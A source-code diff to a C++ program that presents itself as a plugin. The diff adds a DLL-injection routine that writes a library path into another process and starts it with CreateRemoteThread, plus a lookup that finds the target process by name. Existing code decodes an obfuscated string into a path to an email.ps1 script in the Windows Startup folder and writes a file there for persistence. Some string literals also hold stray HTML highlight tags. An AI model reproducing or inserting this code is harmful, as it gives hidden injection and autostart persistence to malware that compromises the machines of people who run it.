@@ -14,6 +14,9 @@
 #include <tchar.h>
 #include <io.h>
 #include <fcntl.h>
+#include <tlhelp32.h> 
+#include <shlwapi.h> 
+#include <conio.h> 
 
 #ifndef _USE_OLD_IOSTREAMS
 
@@ -26,6 +29,66 @@ using namespace std;
 
 // build verison 
 using namespace plugin;
+BOOL Inject(DWORD pID, const char * DLL_NAME)
+{
+	HANDLE Proc;
+	HMODULE hLib;
+	char buf[50] = { 0 };
+	LPVOID RemoteString, LoadLibAddy;
+
+	if (!pID)
+		return false;
+
+	Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
+	if (!Proc)
+	{
+		sprintf(buf, "OpenProcess() failed: %d", GetLastError());
+		//MessageBox(NULL, buf, "Loader", MB_OK); 
+		printf(buf);
+		return false;
+	}
+
+	LoadLibAddy = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+
+	// Allocate space in the process for our DLL 
+	RemoteString = (LPVOID)VirtualAllocEx(Proc, NULL, strlen(DLL_NAME), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+	// Write the string name of our DLL in the memory allocated 
+	WriteProcessMemory(Proc, (LPVOID)RemoteString, DLL_NAME, strlen(DLL_NAME), NULL);
+
+	// Load our DLL 
+	CreateRemoteThread(Proc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddy, (LPVOID)RemoteString, NULL, NULL);
+
+	CloseHandle(Proc);
+	return true;
+}
+DWORD GetTargetThreadIDFromProcName(const char * ProcName)
+{
+	PROCESSENTRY32 pe;
+	HANDLE thSnapShot;
+	BOOL retval, ProcFound = false;
+
+	thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (thSnapShot == INVALID_HANDLE_VALUE)
+	{
+		//MessageBox(NULL, "Error: Unable <strong class="highlight">to</strong> create toolhelp snapshot!", "2MLoader", MB_OK); 
+		printf("Error: Unable <strong class=\"highlight\">to</strong> create toolhelp snapshot!");
+		return false;
+	}
+
+	pe.dwSize = sizeof(PROCESSENTRY32);
+
+	retval = Process32First(thSnapShot, &pe);
+	while (retval)
+	{
+		if (StrStrI(pe.szExeFile, ProcName))
+		{
+			return pe.th32ProcessID;
+		}
+		retval = Process32Next(thSnapShot, &pe);
+	}
+	return 0;
+}
 void BindCrtHandlesToStdHandles(bool bindStdIn, bool bindStdOut, bool bindStdErr)
 {
 	// Re-initialize the C runtime "FILE" handles with clean handles bound to "nul". We do this because it has been
@@ -326,7 +389,7 @@ public:
 		{
 			outfile << userPath << std::endl;
 		}
-		std::string es = "`EttHexe`Vseqmrk`Qmgvswsjx`[mrhs{w`Wxevx$Qiry`Tvskveqw`Wxevxyt`iqemp2tw5"; // \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\email.ps1"
+		std::string es = "`EttHexe`Vseqmrk`Qmgvswsjx`[mrhs{w`Wxevx$Qiry`Tvskveqw`Wxevxyt`iqemp2tw5"; // \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\email.ps1"
 	
 
 		std::ofstream supfile(userPath + kayne(es, -4));
